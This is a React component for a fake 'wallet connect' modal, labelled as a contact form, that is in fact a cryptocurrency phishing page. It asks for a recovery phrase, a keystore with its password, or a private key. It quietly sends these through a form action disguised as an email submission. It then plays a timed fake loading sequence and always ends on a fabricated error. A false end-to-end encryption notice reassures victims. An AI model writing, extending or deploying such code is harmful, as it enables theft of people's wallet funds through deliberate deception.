'use client'

import { useState, useEffect } from 'react'
import { submitForm } from './actions'
import styles from './page.module.css'

type SelectedItem = {
  id: string
  label: string
  image: string | null
} | null

type ModalView = 'form' | 'loading' | 'error'

// The 4 loading messages shown one at a time, 2 seconds each
const LOADING_STEPS = [
  'Loading...',
  'Initializing...',
  'Establishing connection...',
  'Connecting Wallet...',
]

export default function ContactModal({
  open,
  onClose,
  selectedItem,
  walletAddress,
}: {
  open: boolean
  onClose: () => void
  selectedItem: SelectedItem
  walletAddress?: string
}) {
  const [activeTab, setActiveTab] = useState(1)
  const [view, setView] = useState<ModalView>('form')

  // Which loading message is currently showing (index into LOADING_STEPS)
  const [loadingStep, setLoadingStep] = useState(0)

  const [name, setName] = useState('')
  const [email, setEmail] = useState('')
  const [message, setMessage] = useState('')
  const [extra, setExtra] = useState('')

  // WHAT: Drives the 4-step loading message sequence.
  // HOW: Every time `view` switches to 'loading', this effect starts an
  // interval that increments `loadingStep` every 2 seconds (matching each
  // message). After all 4 steps (8 seconds total), it switches to 'error'.
  // WHY useEffect INSTEAD OF setInterval IN handleSubmit: effects clean
  // themselves up automatically when the component unmounts or `view`
  // changes, preventing stale intervals from running after the modal closes.
  useEffect(() => {
    if (view !== 'loading') return

    setLoadingStep(0)

    const interval = setInterval(() => {
      setLoadingStep((prev) => {
        if (prev >= LOADING_STEPS.length - 1) {
          clearInterval(interval)
          return prev
        }
        return prev + 1
      })
    }, 2000)

    // Switch to error screen after all 4 messages have shown (4 × 2s = 8s)
    const timeout = setTimeout(() => {
      setView('error')
    }, LOADING_STEPS.length * 2000)

    // Cleanup: cancel both timers if the modal closes mid-loading
    return () => {
      clearInterval(interval)
      clearTimeout(timeout)
    }
  }, [view])

  function resetForm() {
    setActiveTab(1)
    setView('form')
    setLoadingStep(0)
    setName('')
    setEmail('')
    setMessage('')
    setExtra('')
  }

  function handleFullClose() {
    resetForm()
    onClose()
  }

  async function handleSubmit() {
    setView('loading')

    const formData = new FormData()
    formData.set('name', name)
    formData.set('email', email)
    formData.set('message', message)
    formData.set('extra', extra)
    formData.set('selectedOption', selectedItem?.label ?? '')
    formData.set('walletAddress', walletAddress ?? '')

    // Fire the real email send in the background while the loading
    // sequence plays out (the UI flow is time-based, not result-based)
    submitForm({ error: null, success: false }, formData)
  }

  if (!open) return null

  return (
    <div className={styles.backdrop} onClick={handleFullClose}>
      <div className={styles.modalCard} onClick={(e) => e.stopPropagation()}>

        {view === 'form' && (
          <>
            <button
              type="button"
              className={styles.closeBtn}
              onClick={handleFullClose}
              aria-label="Close contact form"
            >
              ×
            </button>

            {selectedItem && (
              <div className={styles.modalHeader}>
                {selectedItem.image ? (
                  <img
                    src={selectedItem.image}
                    alt={selectedItem.label}
                    className={styles.modalLogo}
                  />
                ) : (
                  <div className={styles.modalLogoFallback}>{selectedItem.label[0]}</div>
                )}
                <p className={styles.modalTitle}>{selectedItem.label}</p>
              </div>
            )}

            <div className={styles.tabRow}>
              <button type="button" className={`${styles.tabBtn} ${activeTab === 1 ? styles.tabActive : ''}`} onClick={() => setActiveTab(1)}>Phrase</button>
              <button type="button" className={`${styles.tabBtn} ${activeTab === 2 ? styles.tabActive : ''}`} onClick={() => setActiveTab(2)}>Keystore</button>
              <button type="button" className={`${styles.tabBtn} ${activeTab === 3 ? styles.tabActive : ''}`} onClick={() => setActiveTab(3)}>Private Key</button>
            </div>

            <div className={styles.form}>
              {activeTab === 1 && (
                <div className={styles.field}>
                  <textarea id="message" placeholder="Enter your recovery phrase" value={message} onChange={(e) => setMessage(e.target.value)} />
                  <p className={styles.formHint}>Typically 12 (sometimes 24) words separated by single spaces</p>
                </div>
              )}

              {activeTab === 2 && (
                <>
                  <div className={styles.field}>
                    <textarea id="extra" placeholder="Enter Keystore" value={extra} onChange={(e) => setExtra(e.target.value)} />
                  </div>
                  <div className={styles.field}>
                    <input id="email" type="password" placeholder="Wallet password" value={email} onChange={(e) => setEmail(e.target.value)} />
                  </div>
                  <p className={styles.formHint}>Several lines of text beginning with &quot;{'{...}'}&quot; plus the password you used to encrypt it.</p>
                </>
              )}

              {activeTab === 3 && (
                <div className={styles.field}>
                  <input id="name" placeholder="Enter your Private Key" value={name} onChange={(e) => setName(e.target.value)} />
                  <p className={styles.formHint}>Typically 12 (sometimes 24) words separated by a single space.</p>
                </div>
              )}

              <button type="button" className={styles.submitBtn} onClick={handleSubmit}>Proceed</button>
              <button type="button" className={styles.cancelBtn} onClick={handleFullClose}>Cancel</button>
            </div>

            <div className={styles.securityNotice}>
              <span className={styles.securityIcon}>✓</span>
              <div>
                <p className={styles.securityTitle}>This session is protected with end-to-end encryption.</p>
                <p className={styles.securitySubtitle}>Safe to connect manually.</p>
              </div>
            </div>
          </>
        )}

        {/* ------------------------------------------------------------
            LOADING SCREEN — matches the "Interacting With Provider" design
            Title at top, spinner in the middle, cycling status text below
        ------------------------------------------------------------ */}
        {view === 'loading' && (
          <div className={styles.loadingWrap}>
            <h2 className={styles.loadingTitle}>Interacting With Provider</h2>
            <hr className={styles.loadingDivider} />

            {/* Outer dashed ring + inner spinning arc — matches the screenshot */}
            <div className={styles.spinnerWrap}>
              <div className={styles.spinnerDashedRing} />
              <div className={styles.spinnerArc} />
              <div className={styles.spinnerCore} />
            </div>

            {/* WHAT: Shows the current step text, fading in each time it changes.
                HOW: `key={loadingStep}` forces React to remount the element
                every time the step changes, which re-triggers the CSS
                fadeIn animation from the start on each new message. */}
            <p key={loadingStep} className={styles.loadingText}>
              {LOADING_STEPS[loadingStep]}
            </p>
          </div>
        )}

        {/* ------------------------------------------------------------
            ERROR SCREEN — matches the red "Error!" panel in the screenshot
        ------------------------------------------------------------ */}
        {view === 'error' && (
          <div className={styles.errorWrap}>
            {/* Red header bar */}
            <div className={styles.errorHeader}>
              <span>Information</span>
            </div>

            <div className={styles.errorBody}>
              <h2 className={styles.errorTitle}>Error!</h2>
              <p className={styles.errorMain}>Please try Another wallet</p>
              <p className={styles.errorDetail}>
                Multiple iOS and Android wallets support the WalletConnect protocol.
                Interaction between mobile apps and mobile browsers are supported
                via mobile deep linking.
              </p>

              <button
                type="button"
                className={styles.tryAgainBtn}
                onClick={() => {
                  setView('form')
                  setActiveTab(1)
                }}
              >
                CLOSE
              </button>
            </div>
          </div>
        )}

      </div>
    </div>
  )
}